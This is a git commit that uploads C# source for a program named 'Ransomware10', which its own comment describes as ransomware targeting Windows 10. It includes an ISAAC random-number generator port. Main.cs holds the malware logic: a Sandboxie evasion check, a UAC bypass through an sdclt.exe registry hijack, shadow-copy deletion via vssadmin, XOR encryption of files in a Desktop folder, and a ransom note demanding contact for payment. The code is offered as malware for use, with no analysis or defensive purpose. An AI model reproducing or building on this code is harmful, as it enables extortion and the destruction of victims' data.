05ef95c662fdca7db35dff0dd4badeec8033a810
Choudai <choudai@protonmail.ch>
2017-05-04 18:25:20 -0400

    Add files via upload

---
+++ R10/Ransomware10/ISAAC.cs
@@ -0,0 +1,177 @@
+﻿namespace Ransomware10
+{
+
+/**
+------------------------------------------------------------------------------
+Rand.java: By Bob Jenkins.  My random number generator, ISAAC.
+  rand.init() -- initialize
+  rand.val()  -- get a random value
+MODIFIED:
+  960327: Creation (addition of randinit, really)
+  970719: use context, not global variables, for internal state
+  980224: Translate to Java
+------------------------------------------------------------------------------
+**/
+
+    public class ISAAC
+    {
+        public const int SIZEL = 9;              
+        public const int SIZE = 1 << SIZEL;              
+        public const int MASK = (SIZE - 1) << 2;           
+        public int count;                           
+        public int[] rsl;                            
+        public int[] mem;                                  
+        private int a;                                           
+        private int b;                                       
+        private int c;             
+
+        public ISAAC()
+        {
+            mem = new int[SIZE];
+            rsl = new int[SIZE];
+            Init(false);
+        }
+
+        public ISAAC(int[] seed)
+        {
+            mem = new int[SIZE];
+            rsl = new int[SIZE];
+            for (int i = 0; i < seed.Length; ++i)
+            {
+                rsl[i] = seed[i];
+            }
+            Init(true);
+        }
+
+        public void Isaac()
+        {
+            int i, j, x, y;
+
+            b += ++c;
+            for (i = 0, j = SIZE / 2; i < SIZE / 2;)
+            {
+                x = mem[i];
+                a ^= a << 13;
+                a += mem[j++];
+                mem[i] = y = mem[(x & MASK) >> 2] + a + b;
+                rsl[i++] = b = mem[((y >> SIZEL) & MASK) >> 2] + x;
+
+                x = mem[i];
+                a ^= (int)((uint)a >> 6);
+                a += mem[j++];
+                mem[i] = y = mem[(x & MASK) >> 2] + a + b;
+                rsl[i++] = b = mem[((y >> SIZEL) & MASK) >> 2] + x;
+
+                x = mem[i];
+                a ^= a << 2;
+                a += mem[j++];
+                mem[i] = y = mem[(x & MASK) >> 2] + a + b;
+                rsl[i++] = b = mem[((y >> SIZEL) & MASK) >> 2] + x;
+
+                x = mem[i];
+                a ^= (int)((uint)a >> 16);
+                a += mem[j++];
+                mem[i] = y = mem[(x & MASK) >> 2] + a + b;
+                rsl[i++] = b = mem[((y >> SIZEL) & MASK) >> 2] + x;
+            }
+
+            for (j = 0; j < SIZE / 2;)
+            {
+                x = mem[i];
+                a ^= a << 13;
+                a += mem[j++];
+                mem[i] = y = mem[(x & MASK) >> 2] + a + b;
+                rsl[i++] = b = mem[((y >> SIZEL) & MASK) >> 2] + x;
+
+                x = mem[i];
+                a ^= (int)((uint)a >> 6);
+                a += mem[j++];
+                mem[i] = y = mem[(x & MASK) >> 2] + a + b;
+                rsl[i++] = b = mem[((y >> SIZEL) & MASK) >> 2] + x;
+
+                x = mem[i];
+                a ^= a << 2;
+                a += mem[j++];
+                mem[i] = y = mem[(x & MASK) >> 2] + a + b;
+                rsl[i++] = b = mem[((y >> SIZEL) & MASK) >> 2] + x;
+
+                x = mem[i];
+                a ^= (int)((uint)a >> 16);
+                a += mem[j++];
+                mem[i] = y = mem[(x & MASK) >> 2] + a + b;
+                rsl[i++] = b = mem[((y >> SIZEL) & MASK) >> 2] + x;
+            }
+        }
+
+        public void Init(bool flag)
+        {
+            int i;
+            int a, b, c, d, e, f, g, h;
+            a = b = c = d = e = f = g = h = unchecked((int)0x9e3779b9);                       
+
+            for (i = 0; i < 4; ++i)
+            {
+                a ^= b << 11; d += a; b += c;
+                b ^= (int)((uint)c >> 2); e += b; c += d;
+                c ^= d << 8; f += c; d += e;
+                d ^= (int)((uint)e >> 16); g += d; e += f;
+                e ^= f << 10; h += e; f += g;
+                f ^= (int)((uint)g >> 4); a += f; g += h;
+                g ^= h << 8; b += g; h += a;
+                h ^= (int)((uint)a >> 9); c += h; a += b;
+            }
+
+            for (i = 0; i < SIZE; i += 8)
+            {          
+                if (flag)
+                {
+                    a += rsl[i]; b += rsl[i + 1]; c += rsl[i + 2]; d += rsl[i + 3];
+                    e += rsl[i + 4]; f += rsl[i + 5]; g += rsl[i + 6]; h += rsl[i + 7];
+                }
+                a ^= b << 11; d += a; b += c;
+                b ^= (int)((uint)c >> 2); e += b; c += d;
+                c ^= d << 8; f += c; d += e;
+                d ^= (int)((uint)e >> 16); g += d; e += f;
+                e ^= f << 10; h += e; f += g;
+                f ^= (int)((uint)g >> 4); a += f; g += h;
+                g ^= h << 8; b += g; h += a;
+                h ^= (int)((uint)a >> 9); c += h; a += b;
+                mem[i] = a; mem[i + 1] = b; mem[i + 2] = c; mem[i + 3] = d;
+                mem[i + 4] = e; mem[i + 5] = f; mem[i + 6] = g; mem[i + 7] = h;
+            }
+
+            if (flag)
+            {      
+                for (i = 0; i < SIZE; i += 8)
+                {
+                    a += mem[i]; b += mem[i + 1]; c += mem[i + 2]; d += mem[i + 3];
+                    e += mem[i + 4]; f += mem[i + 5]; g += mem[i + 6]; h += mem[i + 7];
+                    a ^= b << 11; d += a; b += c;
+                    b ^= (int)((uint)c >> 2); e += b; c += d;
+                    c ^= d << 8; f += c; d += e;
+                    d ^= (int)((uint)e >> 16); g += d; e += f;
+                    e ^= f << 10; h += e; f += g;
+                    f ^= (int)((uint)g >> 4); a += f; g += h;
+                    g ^= h << 8; b += g; h += a;
+                    h ^= (int)((uint)a >> 9); c += h; a += b;
+                    mem[i] = a; mem[i + 1] = b; mem[i + 2] = c; mem[i + 3] = d;
+                    mem[i + 4] = e; mem[i + 5] = f; mem[i + 6] = g; mem[i + 7] = h;
+                }
+            }
+
+            Isaac();
+            count = SIZE;
+        }
+
+        public int val()
+        {
+            if (0 == count--)
+            {
+                Isaac();
+                count = SIZE - 1;
+            }
+            return rsl[count];
+        }
+    }
+}
+
---
+++ R10/Ransomware10/Main.cs
@@ -0,0 +1,137 @@
+﻿using Microsoft.Win32;
+using System;
+using System.Diagnostics;
+using System.IO;
+using System.Runtime.InteropServices;
+using System.Security.Principal;
+using System.Threading;
+
+namespace Ransomware10
+{
+
+    /// <summary>
+    /// The Fastest Most Lightweight Ransomware Targetting Windows 10. @Choudai
+    /// </summary>
+    
+    class Program
+    {
+        private static string[] Files = null;
+        private static string Desktop = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
+        private static string Apps = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
+        private static string ID = Environment.MachineName;
+        private static string Assembly = System.Reflection.Assembly.GetEntryAssembly().Location;
+        private static RegistryKey Check = Registry.CurrentUser.OpenSubKey("Software\\" + ID);
+
+        [STAThread]
+        static void Main()
+        {
+            Sandboxie();
+            if (IsWindows10())
+            {
+                Elevate();
+                Mutex();
+                Recovery();
+                try
+                {
+                Encrypt();
+                }
+                catch { };
+                Note();
+                Environment.Exit(0);
+            }
+            else
+            {
+                Environment.Exit(0);
+            }
+        }
+
+        [DllImport("kernel32.dll")]
+        public static extern IntPtr GetModuleHandle(string lpModuleName);
+        private static void Sandboxie()
+        {
+            if (GetModuleHandle("SbieDll.dll").ToInt32() != 0)
+            {
+                Environment.Exit(0);
+            }
+        }
+
+        static bool IsWindows10()
+        {
+            var Name = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion");
+            string productName = (string)Name.GetValue("ProductName");
+            return productName.StartsWith("Windows 10");
+        }
+        
+        private static void Elevate()
+        {
+            if ((new WindowsPrincipal(WindowsIdentity.GetCurrent())).IsInRole(WindowsBuiltInRole.Admi​nistrator) == false)
+            {
+                Registry.CurrentUser.CreateSubKey("Software\\Classes\\exefile\\shell\\runas\\command").SetValue("isolatedCommand", Assembly);
+                Process.Start("sdclt.exe /kickoffelev");
+                Registry.CurrentUser.DeleteSubKey("Software\\Classes\\exefile\\shell\\runas\\command");
+                Environment.Exit(0);
+            }
+        }
+
+        private static void Mutex()
+        {
+            bool x;
+            Mutex m = new Mutex(true, "Dupe", out x);
+            if (!x)
+            {
+                Environment.Exit(0);
+            }
+            else
+            {
+                Once();
+            }
+        }
+
+        private static void Once()
+        {
+            try
+            {
+                Object N = Check.GetValue("Installed");
+                if (N != null)
+                {
+                    Environment.Exit(0);
+                }
+            }
+            catch { };
+        }
+
+        private static void Recovery()
+        {
+            try
+            {
+                Process cmd = new Process();
+                ProcessStartInfo startInfo = new ProcessStartInfo();
+                startInfo.WindowStyle = ProcessWindowStyle.Hidden;
+                startInfo.FileName = "cmd.exe";
+                startInfo.Arguments = "/c vssadmin delete shadows /all /quiet";
+                startInfo.Verb = "runas";
+                cmd.StartInfo = startInfo;
+                cmd.Start();
+            }
+            catch { };
+        }
+
+        private static void Encrypt()
+        {
+            Files = Directory.GetFiles(Desktop + "\\TEST");
+            ISAAC csprng = Crypt.PrepareKey();
+            if (csprng == null) return;
+            foreach (string Phile in Files)
+            {
+                Crypt.CryptFile(csprng, new byte[] { 0x54, 0x45, 0x53, 0x54, 0x4B, 0x45, 0x59 }, Phile);
+            }
+        }
+
+        private static void Note()
+        {
+            string[] Lines = { "SORRY! Your files have been encrypted and obfuscated.", "File contents are encrypted with a random key and are not usable. (XOR-ISAAC).", "Do not try to decrypt the files using tools or services.", "These may damage your data making recovery IMPOSSIBLE!", "If you wish to decrypt your files for the lowest price possible you must contact us.", "We can be reached by the following emails:", "", "decryptme@gmail.com", "You MUST include this ID in your message: " + ID, "", "If you do not recieve a reply within 48 hours do not panic.", "Only we can sucessfully decrypt your files; knowing this will protect you from fraud.", "Follow the instructions you recieve on what to do next carefully." };
+            File.WriteAllLines(Desktop + "\\R3AD_M3.txt", Lines);
+            Registry.CurrentUser.CreateSubKey("Software\\" + ID).SetValue("Installed", "1");
+        }
+    }
+}
